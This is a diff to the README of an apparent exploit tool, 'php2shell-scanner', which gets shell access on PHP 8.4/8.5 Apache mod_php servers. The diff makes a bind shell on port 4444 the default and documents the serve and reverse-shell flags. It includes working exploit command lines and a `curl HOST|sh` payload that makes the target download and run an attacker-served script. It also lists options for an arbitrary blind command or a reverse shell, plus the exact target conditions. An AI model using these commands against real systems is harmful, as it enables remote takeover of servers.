@@ -68,17 +68,29 @@ php2shell-scanner --target http://localhost:9080 --exploit --lhost 10.0.0.1 --lp
 
 The executed command is limited to 14 bytes by the forged carrier, so the shell is delivered by making the target fetch it from the attacker: `curl HOST|sh` (curl is present in php:apache images). Because of the 14-byte budget the host must be expressible very shortly: an inet_aton short form (`10.1` for 10.0.0.1, `127.1` for 127.0.0.1), a short DNS name you control (≤5 chars), or `0:PORT` when the listener runs on the target's own loopback. `--lport 80` gives the most room (`curl 10.1|sh`). If nothing fits, the tool says so and suggests alternatives.
 
-Options: `--lhost`/`--lport` (shell target), `--command 'id>/out/p1'` to run a single arbitrary ≤14-byte command blind instead of a shell, `--bind-port N` for a bind shell instead of a reverse shell, and `--profile` (`official` for the official `php:8.4/8.5-apache` images, `official83`, `lab`), `--zif-offset`/`--dtor-offset`/`--htdata-offset` for per-build calibration, `--retries`, `--huge-mb`.
+Options: `--command 'id>/out/p1'` to run a single arbitrary ≤14-byte command blind instead of a shell, `--bind-port N` to choose the bind-shell port (bind is the default shell mode — see below), `--lhost/--lport` for a reverse shell instead, and `--profile` (`official` for the official `php:8.4/8.5-apache` images, `official83`, `lab`), `--zif-offset`/`--dtor-offset`/`--htdata-offset` for per-build calibration, `--retries`, `--huge-mb`.
 
 ## Bind shell
 
-With `--bind-port`, the fetched script instead starts a PHP listener on the target (no `nc`/`socat` needed — a mod_php target always has PHP), and the scanner connects to `<target-host>:<bind-port>` and drives the session itself (one command per line, output returned per line; type `exit` to close). The shell session therefore needs no listener and no target egress at all — only the one-shot script fetch has to reach the attacker:
+Plain `--exploit` is zero-setup: it starts a **bind shell** on the target (listening on `tcp/4444` by default) and the scanner connects to it and drives the session interactively (one command per line, output returned per line; type `exit` to close). The only traffic leaving the target is a single one-shot script fetch, which the scanner arranges automatically (its own address and a free port for loopback targets; a short form of its source IP for remote targets when it fits the 14-byte carrier):
 
 ```
-php2shell-scanner --target http://localhost:9080 --exploit --bind-port 5555 --lhost 10.0.0.1 --lport 4444
+php2shell-scanner --target http://localhost:9080 --exploit
 ```
 
-If you already serve the bind-shell script somewhere (any path, plain text), pass `--no-serve` and point `--lhost`/`--lport` at it. The scanner still connects to the bind port automatically after firing.
+Optional port flags (all have defaults):
+
+- `--bind-port N` — port the bind shell listens on, on the target (default 4444). Passing it selects bind mode.
+- `--serve-port N` — local port the scanner serves the shell script on (default: auto-detected).
+- `--serve-host H` — host the target's `curl` must reach for the script fetch; needed only when auto-detection cannot fit an address into the 14-byte carrier (e.g. a short DNS name you control). `--lhost`/`--lport` still work as aliases here.
+
+For a classic **reverse shell** instead, pass `--lhost` (and optionally `--lport`, default 4444): the scanner serves the script, fires it, and catches the incoming session itself — still no external listener:
+
+```
+php2shell-scanner --target http://localhost:9080 --exploit --lhost 10.1
+```
+
+If you already serve a shell script somewhere (any path, plain text), pass `--no-serve` and point `--serve-host/--serve-port` at it.
 
 The chain requires the same conditions as the public PoCs: Apache prefork + mod_php, `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`, single worker, `KeepAlive Off`, and an amd64 PHP 8.4/8.5 build whose libphp offsets match the profile (heap geometry is build- and environment-sensitive; leaks are retried and rotate the worker between attempts). Authorized testing only.
 
